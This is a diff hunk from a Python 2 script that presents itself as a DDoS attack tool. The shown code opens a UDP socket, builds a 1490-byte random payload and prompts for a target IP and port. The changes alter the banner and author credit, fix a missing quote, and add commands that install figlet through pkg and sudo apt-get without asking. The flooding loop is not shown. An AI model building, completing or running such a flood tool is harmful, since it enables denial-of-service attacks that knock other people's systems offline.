@@ -17,15 +17,16 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
+os.system("pkg install figlet -y")
+os.system("sudo apt-get install figlet")
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet DDos attacker")
 
 print
-print "Author : Jasem-codect"
+print "Creator : Jasem-codect"
 print "Github : https://github.com/Jasem-codect"
-print "Telegram : @jsm_codect
+print "Telegram : @jsm_codect"
 print
-
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
